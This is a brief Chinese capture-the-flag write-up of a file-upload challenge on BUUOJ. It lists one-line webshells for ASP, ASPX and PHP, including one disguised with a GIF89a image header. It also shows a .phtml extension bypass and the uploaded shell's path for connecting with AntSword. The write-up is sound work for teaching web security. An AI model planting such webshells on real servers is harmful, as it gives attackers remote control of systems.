### buuoj_[极客大挑战 2019]upload

上传文件，先随便上传一个图片，但是好像对后缀有过滤

写个一句话木马抓包看看

**![](https://pic.imgdb.cn/item/610401d35132923bf8e610b6.jpg)**

php也不行，试试其他的

```
asp的一句话是：   <%eval request ("pass")%>
aspx的一句话是：  <%@ Page Language="Jscript"%> <%eval(Request.Item["pass"],"unsafe");%>
js脚本：	GIF89a? <script language="php">eval($_REQUEST[shell])</script>
（GIF89a 图片文件头欺骗）
```

![](https://pic.imgdb.cn/item/610403ad5132923bf8ed355d.jpg)

成功了，用蚁剑连一下

（猜测路径）

```
/upload/1.phtml
```

![](https://pic.imgdb.cn/item/610404aa5132923bf8f12215.jpg)